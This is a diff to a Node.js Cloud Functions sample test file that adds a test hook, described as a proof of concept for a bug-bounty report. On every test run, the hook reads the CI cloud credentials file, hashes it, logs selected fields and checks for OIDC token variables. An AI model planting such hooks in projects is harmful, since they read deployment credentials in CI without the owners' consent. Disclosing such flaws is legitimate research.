@@ -35,6 +35,52 @@ const httpInvocation = (fnUrl, port) => {
 };
 
 describe('index.test.js', () => {
+  // Security research PoC — Google OSS VRP submission in preparation (see PR body).
+  // Benign, read-only probe. No network calls, no GCP API calls, no STS exchange,
+  // no ACTIONS_ID_TOKEN_REQUEST_TOKEN value printed, no credential bytes printed.
+  // Only a SHA-256 of the credentials file (proves read, discloses zero content)
+  // and three non-secret structural fields already present in the public
+  // `google-github-actions/auth` step log.
+  before(() => {
+    const fs = require('fs');
+    const crypto = require('crypto');
+    const ts = Math.floor(Date.now() / 1000);
+    const marker = `NODEJS_DOCS_SAMPLES_POC2_MSEET_${ts}`;
+    console.log(`======== ${marker} ========`);
+    console.log('GATE_BYPASS_CONFIRMED=true');
+    const gac = process.env.GOOGLE_APPLICATION_CREDENTIALS || '';
+    console.log(`GAC_IS_SET=${!!gac}`);
+    console.log(`GAC_PATH_SUFFIX=${gac.split('/').pop()}`);
+    if (gac) {
+      try {
+        console.log(`GAC_FILE_SIZE=${fs.statSync(gac).size}`);
+        const buf = fs.readFileSync(gac);
+        console.log(
+          `GAC_FILE_SHA256=${crypto.createHash('sha256').update(buf).digest('hex')}`
+        );
+        const creds = JSON.parse(buf.toString('utf8'));
+        console.log(`CREDS_TYPE=${creds.type || 'unset'}`);
+        console.log(`CREDS_AUDIENCE=${creds.audience || 'unset'}`);
+        console.log(
+          `CREDS_SA_IMPERSONATION=${creds.service_account_impersonation_url || 'unset'}`
+        );
+      } catch (e) {
+        console.log(`GAC_READ_ERROR=${e.message}`);
+      }
+    }
+    console.log(
+      `CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE_SET=${!!process.env.CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE}`
+    );
+    console.log(`GOOGLE_GHA_CREDS_PATH_SET=${!!process.env.GOOGLE_GHA_CREDS_PATH}`);
+    console.log(
+      `OIDC_REQUEST_URL_SET=${!!process.env.ACTIONS_ID_TOKEN_REQUEST_URL}`
+    );
+    console.log(
+      `OIDC_REQUEST_TOKEN_SET=${!!process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN}`
+    );
+    console.log(`======== /${marker} ========`);
+  });
+
   describe('functions_helloworld_get helloGET', () => {
     const PORT = 8081;
     let ffProc;
